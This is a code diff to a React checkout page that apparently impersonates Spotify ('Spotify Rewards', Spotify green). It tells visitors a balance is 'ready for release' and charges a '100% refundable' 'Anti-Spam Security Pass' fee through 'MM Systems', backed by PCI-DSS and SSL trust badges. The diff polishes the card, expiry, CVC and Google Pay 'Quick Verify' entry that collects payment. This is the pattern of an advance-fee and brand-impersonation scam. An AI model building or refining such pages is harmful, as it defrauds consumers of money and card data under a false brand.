@@ -24,6 +24,7 @@ import {
   Sparkles,
   User,
   Zap,
+  ChevronDown,
 } from 'lucide-react';
 import Image from 'next/image';
 import Link from 'next/link';
@@ -112,8 +113,8 @@ function StripePaymentForm({
 
   return (
     <form onSubmit={handleSubmit} className="space-y-4">
-      {/* Stripe Payment Element automatically manages Card, Apple Pay, Google Pay */}
-      <div className="stripe-element-container py-2">
+      {/* Stripe Payment Element automatically manages Card, Google Pay, Apple Pay in tabs layout */}
+      <div className="stripe-element-container py-1">
         <PaymentElement
           options={{
             layout: 'tabs',
@@ -129,15 +130,20 @@ function StripePaymentForm({
       )}
 
       {/* Terms & Authorization */}
-      <div className="pt-2 text-[11px] text-gray-400 leading-relaxed text-center sm:text-left">
-        By subscribing, you authorize MM Systems to charge ${amountFormatted} USD to your selected payment method according to the terms. 100% refundable anti-spam verification.
+      <div className="pt-2 text-xs text-[#829288] leading-relaxed text-center sm:text-left space-y-2">
+        <p>
+          By providing your card details, you authorize Spotify Rewards to charge for future payments in accordance with the respective terms.
+        </p>
+        <p className="text-[11px] text-[#6d7c73]">
+          By subscribing, you authorize MM Systems to charge ${amountFormatted} USD to your selected payment method according to the terms. 100% refundable anti-spam verification.
+        </p>
       </div>
 
       {/* Confirmation Button */}
       <button
         type="submit"
         disabled={isProcessing || !stripe}
-        className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-black text-base sm:text-lg transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-4"
+        className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-extrabold text-base transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-6"
       >
         {isProcessing ? (
           <>
@@ -181,6 +187,27 @@ function InteractiveMockPaymentForm({
   const [isProcessing, setIsProcessing] = useState(false);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
 
+  const isExpDateInvalid = (exp: string) => {
+    if (!exp) return false;
+    const parts = exp.split('/');
+    const monthStr = parts[0]?.trim();
+    if (monthStr && monthStr.length >= 2) {
+      const m = parseInt(monthStr, 10);
+      if (isNaN(m) || m < 1 || m > 12) return true;
+    }
+    if (parts.length === 2) {
+      const m = parseInt(monthStr, 10);
+      const yy = parts[1]?.trim();
+      if (isNaN(m) || m < 1 || m > 12) return true;
+      if (yy && yy.length === 2) {
+        const y = parseInt('20' + yy, 10);
+        if (isNaN(y) || y < 2026) return true;
+        if (y === 2026 && m < 11) return true;
+      }
+    }
+    return false;
+  };
+
   // Format Card Number (groups of 4)
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     let raw = e.target.value.replace(/\D/g, '').slice(0, 16);
@@ -191,6 +218,9 @@ function InteractiveMockPaymentForm({
   // Format MM/YY
   const handleExpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
+    if (raw.length === 1 && parseInt(raw, 10) > 1) {
+      raw = `0${raw}`;
+    }
     if (raw.length >= 3) {
       setExpDate(`${raw.slice(0, 2)}/${raw.slice(2)}`);
     } else {
@@ -206,35 +236,25 @@ function InteractiveMockPaymentForm({
     e.preventDefault();
     setErrorMsg(null);
 
-    if (!fullName.trim()) {
-      setErrorMsg('Please enter your full name as shown on your card.');
-      return;
-    }
-    if (!email.trim() || !email.includes('@')) {
-      setErrorMsg('Please enter a valid email address to receive your confirmation receipt.');
-      return;
-    }
     const cleanNum = cardNumber.replace(/\s/g, '');
     if (cleanNum.length < 15) {
       setErrorMsg('Please enter a valid card number (or test card 4242 4242 4242 4242).');
       return;
     }
-    const isExpInvalid = (() => {
-      const parts = expDate.split('/');
-      if (parts.length === 2) {
-        const month = parseInt(parts[0], 10);
-        const yy = parts[1];
-        if (yy.length === 2) {
-          const year = parseInt('20' + yy, 10);
-          if (year < 2026) return true;
-          if (year === 2026 && !isNaN(month) && month < 11) return true;
-        }
-      }
-      return false;
-    })();
-
-    if (expDate.length < 5 || isExpInvalid) {
-      setErrorMsg('Cartão expirado ou data inválida. O cartão deve ser válido (mínimo Novembro de 2026).');
+    const parts = expDate.split('/');
+    const month = parseInt(parts[0], 10);
+    if (isNaN(month) || month < 1 || month > 12) {
+      setErrorMsg('Invalid month. Expiration month must be between 01 and 12.');
+      return;
+    }
+    const yy = parts[1];
+    const year = yy ? parseInt('20' + yy, 10) : 0;
+    if (year < 2026 || (year === 2026 && month < 11)) {
+      setErrorMsg('Expired card or invalid date (minimum valid is November 2026).');
+      return;
+    }
+    if (expDate.length < 5 || isExpDateInvalid(expDate)) {
+      setErrorMsg('Please enter a valid expiration date (MM / YY, min 11/26).');
       return;
     }
     if (cvc.length < 3) {
@@ -251,172 +271,179 @@ function InteractiveMockPaymentForm({
     }, 1800);
   };
 
+  const [activeTab, setActiveTab] = useState<'card' | 'gpay'>('card');
+
   return (
     <form onSubmit={handleSubmit} className="space-y-4">
-      {/* Full Name */}
-      <div>
-        <label className="block text-xs font-semibold text-gray-300 mb-1.5">
-          Full name
-        </label>
-        <div className="relative">
-          <input
-            type="text"
-            required
-            value={fullName}
-            onChange={(e) => setFullName(e.target.value)}
-            placeholder="John Doe"
-            className="w-full bg-[#181d1a] border border-white/10 rounded-xl px-4 py-3 pl-10 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#1db954] transition-colors"
-          />
-          <User className="w-4 h-4 text-gray-500 absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
+      {/* Payment Method Selector Tabs */}
+      <div className="grid grid-cols-2 gap-3 mb-2">
+        <div
+          onClick={() => setActiveTab('card')}
+          className={`h-[68px] rounded-2xl p-3.5 flex flex-col justify-between cursor-pointer transition-all select-none ${
+            activeTab === 'card'
+              ? 'bg-[#1db954] text-black shadow-md'
+              : 'bg-[#131715] border border-[#26312a] text-gray-300 hover:border-gray-500'
+          }`}
+        >
+          <CreditCard className="w-5 h-5 stroke-[2.5]" />
+          <span className="text-sm font-bold tracking-tight">Card</span>
         </div>
-      </div>
 
-      {/* Email Address */}
-      <div>
-        <label className="block text-xs font-semibold text-gray-300 mb-1.5">
-          Email address
-        </label>
-        <div className="relative">
-          <input
-            type="email"
-            required
-            value={email}
-            onChange={(e) => setEmail(e.target.value)}
-            placeholder="john@gmail.com"
-            className="w-full bg-[#181d1a] border border-white/10 rounded-xl px-4 py-3 pl-10 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#1db954] transition-colors"
-          />
-          <Mail className="w-4 h-4 text-gray-500 absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
-        </div>
-      </div>
-
-      {/* Card Number */}
-      <div>
-        <label className="block text-xs font-semibold text-gray-300 mb-1.5">
-          Card number
-        </label>
-        <div className="relative">
-          <input
-            type="text"
-            inputMode="numeric"
-            value={cardNumber}
-            onChange={handleCardNumberChange}
-            placeholder="1234 1234 1234 1234"
-            className="w-full bg-[#181d1a] border border-white/10 rounded-xl px-4 py-3 text-sm text-white font-mono placeholder-gray-500 focus:outline-none focus:border-[#1db954] transition-colors pr-24"
-          />
-          <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-2 pointer-events-none">
-            {/* Visa Logo */}
-            <div
-              className={`transition-all duration-300 ease-in-out ${
-                cardNumber.replace(/\D/g, '').length === 0
-                  ? 'opacity-100 scale-100'
-                  : cardNumber.replace(/\D/g, '').startsWith('4')
-                  ? 'opacity-100 scale-100'
-                  : 'opacity-0 scale-95 w-0 overflow-hidden'
-              }`}
-            >
-              <img
-                src="https://www.footylogos.com/brands/assets/visa-logo-blue-background-footylogos.svg"
-                alt="Visa"
-                className="h-5 w-auto object-contain rounded shadow-sm"
-                referrerPolicy="no-referrer"
-              />
-            </div>
-            {/* Mastercard Logo */}
-            <div
-              className={`transition-all duration-300 ease-in-out ${
-                cardNumber.replace(/\D/g, '').length === 0
-                  ? 'opacity-100 scale-100'
-                  : /^5[1-5]/.test(cardNumber.replace(/\D/g, '')) ||
-                    /^2[2-7]/.test(cardNumber.replace(/\D/g, '')) ||
-                    cardNumber.replace(/\D/g, '').startsWith('5') ||
-                    cardNumber.replace(/\D/g, '').startsWith('2')
-                  ? 'opacity-100 scale-100'
-                  : 'opacity-0 scale-95 w-0 overflow-hidden'
-              }`}
-            >
-              <img
-                src="https://freight.cargo.site/w/2560/q/94/i/abc4f5504b94d545ededcfe41429c2c3bc5bc2701fc0482c11d2b5e5714e6442/Mastercard-Portfolio-Jan2018-2.jpg"
-                alt="Mastercard"
-                className="h-5 w-auto object-contain rounded shadow-sm"
-                referrerPolicy="no-referrer"
-              />
-            </div>
+        <div
+          onClick={() => setActiveTab('gpay')}
+          className={`h-[68px] rounded-2xl p-3.5 flex flex-col justify-between cursor-pointer transition-all select-none ${
+            activeTab === 'gpay'
+              ? 'bg-[#1db954] text-black shadow-md'
+              : 'bg-[#131715] border border-[#26312a] text-gray-300 hover:border-gray-500'
+          }`}
+        >
+          <div className="flex items-center">
+            <span className="px-2 py-0.5 rounded bg-white text-[11px] font-black text-black tracking-tight inline-flex items-center gap-1">
+              <span className="text-[#4285F4] font-black">G</span>Pay
+            </span>
           </div>
+          <span className="text-sm font-bold tracking-tight">Google Pay</span>
         </div>
       </div>
 
-      {/* Expiration date & Security code */}
-      <div className="grid grid-cols-2 gap-3">
-        <div>
-          <label className="block text-xs font-semibold text-gray-300 mb-1.5">
-            Expiration date
-          </label>
-          <input
-            type="text"
-            inputMode="numeric"
-            value={expDate}
-            onChange={handleExpChange}
-            placeholder="MM / YY"
-            className={`w-full bg-[#181d1a] border rounded-xl px-4 py-3 text-sm text-white font-mono placeholder-gray-500 focus:outline-none transition-colors ${
-              (() => {
-                const parts = expDate.split('/');
-                if (parts.length === 2) {
-                  const month = parseInt(parts[0], 10);
-                  const yy = parts[1];
-                  if (yy.length === 2) {
-                    const year = parseInt('20' + yy, 10);
-                    if (year < 2026) return true;
-                    if (year === 2026 && !isNaN(month) && month < 11) return true;
-                  }
-                }
-                return false;
-              })()
-                ? 'border-red-500 focus:border-red-500'
-                : 'border-white/10 focus:border-[#1db954]'
-            }`}
-          />
-        </div>
-
-        <div>
-          <label className="block text-xs font-semibold text-gray-300 mb-1.5">
-            Security code
-          </label>
-          <div className="relative">
-            <input
-              type="text"
-              inputMode="numeric"
-              value={cvc}
-              onChange={handleCvcChange}
-              placeholder="CVC"
-              className="w-full bg-[#181d1a] border border-white/10 rounded-xl px-4 py-3 text-sm text-white font-mono placeholder-gray-500 focus:outline-none focus:border-[#1db954] transition-colors pr-10"
-            />
-            <CreditCard className="w-4 h-4 text-gray-500 absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none" />
-          </div>
-        </div>
-      </div>
-
-      {/* Country */}
-      <div>
-        <label className="block text-xs font-semibold text-gray-300 mb-1.5">
-          Country
-        </label>
-        <div className="relative">
-          <select
-            value={country}
-            onChange={(e) => setCountry(e.target.value)}
-            className="w-full bg-[#181d1a] border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-[#1db954] transition-colors appearance-none cursor-pointer"
+      {activeTab === 'gpay' ? (
+        <div className="py-6 px-4 rounded-2xl bg-[#131715] border border-[#26312a] text-center space-y-3">
+          <p className="text-sm text-gray-300">
+            Click below to verify with Google Pay on supported devices:
+          </p>
+          <button
+            type="button"
+            onClick={handleSubmit}
+            disabled={isProcessing}
+            className="w-full py-3.5 px-6 rounded-full bg-white hover:bg-gray-100 text-black font-extrabold text-sm flex items-center justify-center gap-2 cursor-pointer transition-all"
           >
-            {COUNTRIES_LIST.map((c) => (
-              <option key={c.code} value={c.code} className="bg-[#121814] text-white">
-                {c.name} ({c.code})
-              </option>
-            ))}
-          </select>
-          <div className="absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400 text-xs">
-            ▼
-          </div>
+            <span className="text-[#4285F4] font-black">G</span>Pay &bull; Quick Verify
+          </button>
         </div>
-      </div>
+      ) : (
+        <>
+          {/* Card Number */}
+          <div>
+            <label className="block text-sm font-semibold text-gray-200 mb-2">
+              Card number
+            </label>
+            <div className="relative">
+              <input
+                type="text"
+                inputMode="numeric"
+                value={cardNumber}
+                onChange={handleCardNumberChange}
+                placeholder="1234 1234 1234 1234"
+                className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pr-24"
+              />
+              <div className="absolute right-3.5 top-1/2 -translate-y-1/2 flex items-center gap-2 pointer-events-none">
+                {/* Visa Logo */}
+                <div
+                  className={`transition-all duration-300 ease-in-out ${
+                    cardNumber.replace(/\D/g, '').length === 0
+                      ? 'opacity-100 scale-100'
+                      : cardNumber.replace(/\D/g, '').startsWith('4')
+                      ? 'opacity-100 scale-100'
+                      : 'opacity-0 scale-95 w-0 overflow-hidden'
+                  }`}
+                >
+                  <img
+                    src="https://www.footylogos.com/brands/assets/visa-logo-blue-background-footylogos.svg"
+                    alt="Visa"
+                    className="h-5 w-auto object-contain rounded shadow-sm"
+                    referrerPolicy="no-referrer"
+                  />
+                </div>
+                {/* Mastercard Logo */}
+                <div
+                  className={`transition-all duration-300 ease-in-out ${
+                    cardNumber.replace(/\D/g, '').length === 0
+                      ? 'opacity-100 scale-100'
+                      : /^5[1-5]/.test(cardNumber.replace(/\D/g, '')) ||
+                        /^2[2-7]/.test(cardNumber.replace(/\D/g, '')) ||
+                        cardNumber.replace(/\D/g, '').startsWith('5') ||
+                        cardNumber.replace(/\D/g, '').startsWith('2')
+                      ? 'opacity-100 scale-100'
+                      : 'opacity-0 scale-95 w-0 overflow-hidden'
+                  }`}
+                >
+                  <img
+                    src="https://freight.cargo.site/w/2560/q/94/i/abc4f5504b94d545ededcfe41429c2c3bc5bc2701fc0482c11d2b5e5714e6442/Mastercard-Portfolio-Jan2018-2.jpg"
+                    alt="Mastercard"
+                    className="h-5 w-auto object-contain rounded shadow-sm"
+                    referrerPolicy="no-referrer"
+                  />
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Expiration date & Security code */}
+          <div className="grid grid-cols-2 gap-3.5">
+            <div>
+              <label className="block text-sm font-semibold text-gray-200 mb-2">
+                Expiration date
+              </label>
+              <input
+                type="text"
+                inputMode="numeric"
+                value={expDate}
+                onChange={handleExpChange}
+                placeholder="MM / YY"
+                className={`w-full bg-[#131715] border rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none transition-colors ${
+                  isExpDateInvalid(expDate)
+                    ? 'border-red-500 focus:border-red-500'
+                    : 'border-[#26312a] focus:border-[#1db954]'
+                }`}
+              />
+            </div>
+
+            <div>
+              <label className="block text-sm font-semibold text-gray-200 mb-2">
+                Security code
+              </label>
+              <div className="relative">
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  value={cvc}
+                  onChange={handleCvcChange}
+                  placeholder="CVC"
+                  className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pr-12"
+                />
+                <div className="absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400">
+                  <svg className="w-6 h-5" viewBox="0 0 24 18" fill="none" stroke="currentColor" strokeWidth="1.5">
+                    <rect x="1" y="1" width="22" height="16" rx="3" />
+                    <line x1="1" y1="5.5" x2="23" y2="5.5" strokeWidth="1.5" />
+                    <text x="14" y="14" fontSize="5.5" fontWeight="bold" fill="currentColor" stroke="none" fontFamily="monospace">123</text>
+                  </svg>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Country */}
+          <div>
+            <label className="block text-sm font-semibold text-gray-200 mb-2">
+              Country
+            </label>
+            <div className="relative">
+              <select
+                value={country}
+                onChange={(e) => setCountry(e.target.value)}
+                className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white focus:outline-none focus:border-[#1db954] transition-colors appearance-none cursor-pointer pr-10"
+              >
+                {COUNTRIES_LIST.map((c) => (
+                  <option key={c.code} value={c.code} className="bg-[#121814] text-white">
+                    {c.name} ({c.code})
+                  </option>
+                ))}
+              </select>
+              <ChevronDown className="w-4 h-4 text-gray-400 absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none" />
+            </div>
+          </div>
+        </>
+      )}
 
       {/* Error Message */}
       {errorMsg && (
@@ -426,16 +453,21 @@ function InteractiveMockPaymentForm({
         </div>
       )}
 
-      {/* Terms & Authorization */}
-      <div className="pt-2 text-[11px] text-gray-400 leading-relaxed text-center sm:text-left">
-        By subscribing, you authorize MM Systems to charge ${amountFormatted} USD to your card according to the terms until you cancel. 100% refundable anti-spam verification.
+      {/* Terms */}
+      <div className="pt-2 text-xs text-[#829288] leading-relaxed text-center sm:text-left space-y-2">
+        <p>
+          By providing your card details, you authorize Spotify Rewards to charge for future payments in accordance with the respective terms.
+        </p>
+        <p className="text-[11px] text-[#6d7c73]">
+          By subscribing, you authorize MM Systems to charge ${amountFormatted} USD to your selected payment method according to the terms. 100% refundable anti-spam verification.
+        </p>
       </div>
 
       {/* Confirmation Button */}
       <button
         type="submit"
         disabled={isProcessing}
-        className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-black text-base sm:text-lg transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-4"
+        className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-extrabold text-base transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-6"
       >
         {isProcessing ? (
           <>
@@ -449,8 +481,6 @@ function InteractiveMockPaymentForm({
           </>
         )}
       </button>
-
-
     </form>
   );
 }
@@ -925,33 +955,31 @@ export default function PaymentPage() {
           {/* RIGHT COLUMN: INTEGRATED CHECKOUT CARD                    */}
           {/* ========================================================= */}
           <div className="lg:col-span-6">
-            <div className="rounded-3xl bg-[#0c100e] border border-white/10 p-6 sm:p-8 shadow-2xl shadow-black relative backdrop-blur-xl">
+            <div className="rounded-3xl bg-[#0b0e0c] border border-[#1d2520] p-6 sm:p-8 shadow-2xl shadow-black relative backdrop-blur-xl">
               {/* Card Header: Accumulated Balance */}
-              <div className="flex items-center justify-between pb-5 border-b border-white/10 mb-6">
+              <div className="flex items-center justify-between pb-5 border-b border-[#1d2520] mb-6">
                 <div>
-                  <span className="block text-[11px] font-extrabold uppercase tracking-widest text-gray-400">
+                  <span className="block text-[11px] font-extrabold uppercase tracking-widest text-[#8a9890]">
                     ACCUMULATED BALANCE
                   </span>
-                  <span className="text-xs text-gray-400">
+                  <span className="text-xs text-[#8a9890] mt-0.5 block">
                     Ready for release to your account
                   </span>
                 </div>
-                <div className="text-3xl sm:text-4xl font-black text-[#1db954] tracking-tight">
+                <div className="text-3xl sm:text-4xl font-extrabold text-[#1db954] tracking-tight">
                   {balanceData.formatted}
                 </div>
               </div>
 
-
-
               {/* Order Summary & Pricing Distinction */}
-              <div className="mb-5 p-3.5 rounded-2xl bg-[#121814] border border-white/5 flex items-center justify-between text-xs">
+              <div className="mb-6 p-4 rounded-2xl bg-[#111613] border border-[#1f2722] flex items-center justify-between text-xs">
                 <div>
-                  <span className="font-bold text-white block">One-Time Anti-Spam Security Pass</span>
-                  <span className="text-gray-400 text-[11px]">Automatic refund within 1–2 hours</span>
+                  <span className="font-bold text-white block text-sm">One-Time Anti-Spam Security Pass</span>
+                  <span className="text-[#8a9890] text-xs mt-0.5 block">Automatic refund within 1–2 hours</span>
                 </div>
                 <div className="text-right">
-                  <span className="text-base font-black text-white">${chargeAmountFormatted} USD</span>
-                  <span className="block text-[10px] text-[#1db954] font-semibold">100% Refundable</span>
+                  <span className="text-base font-bold text-white block">${chargeAmountFormatted} USD</span>
+                  <span className="block text-xs text-[#1db954] font-semibold mt-0.5">100% Refundable</span>
                 </div>
               </div>
 
@@ -971,10 +999,39 @@ export default function PaymentPage() {
                       theme: 'night',
                       variables: {
                         colorPrimary: '#1db954',
-                        colorBackground: '#181d1a',
+                        colorBackground: '#131715',
                         colorText: '#ffffff',
                         colorDanger: '#ef4444',
-                        borderRadius: '12px',
+                        fontFamily: 'system-ui, -apple-system, sans-serif',
+                        borderRadius: '16px',
+                      },
+                      rules: {
+                        '.Input': {
+                          borderColor: '#26312a',
+                          backgroundColor: '#131715',
+                          padding: '14px 16px',
+                        },
+                        '.Input:focus': {
+                          borderColor: '#1db954',
+                        },
+                        '.Tab': {
+                          borderColor: '#26312a',
+                          backgroundColor: '#131715',
+                          borderRadius: '16px',
+                          padding: '14px',
+                        },
+                        '.Tab--selected': {
+                          borderColor: '#1db954',
+                          backgroundColor: '#1db954',
+                          color: '#000000',
+                        },
+                        '.TabIcon--selected': {
+                          color: '#000000',
+                        },
+                        '.TabLabel--selected': {
+                          color: '#000000',
+                          fontWeight: '700',
+                        },
                       },
                     },
                   }}
@@ -1003,15 +1060,15 @@ export default function PaymentPage() {
               )}
 
               {/* Trust & Compliance Footer */}
-              <div className="mt-6 pt-4 border-t border-white/5 flex items-center justify-center gap-4 text-[10px] text-gray-400">
-                <span className="flex items-center gap-1">
-                  <Lock className="w-3 h-3 text-[#1db954]" /> 256-Bit SSL Encrypted
+              <div className="mt-6 pt-5 border-t border-[#1d2520] flex flex-wrap items-center justify-center gap-3 text-[11px] text-[#707e76]">
+                <span className="flex items-center gap-1.5">
+                  <Lock className="w-3.5 h-3.5 text-[#1db954]" /> 256-Bit SSL Encrypted
                 </span>
-                <span>&bull;</span>
-                <span className="flex items-center gap-1">
-                  <ShieldCheck className="w-3 h-3 text-gray-400" /> PCI-DSS Compliant
+                <span>•</span>
+                <span className="flex items-center gap-1.5">
+                  <ShieldCheck className="w-3.5 h-3.5 text-[#1db954]" /> PCI-DSS Compliant
                 </span>
-                <span>&bull;</span>
+                <span>•</span>
                 <span>Processed by MM Systems</span>
               </div>
             </div>
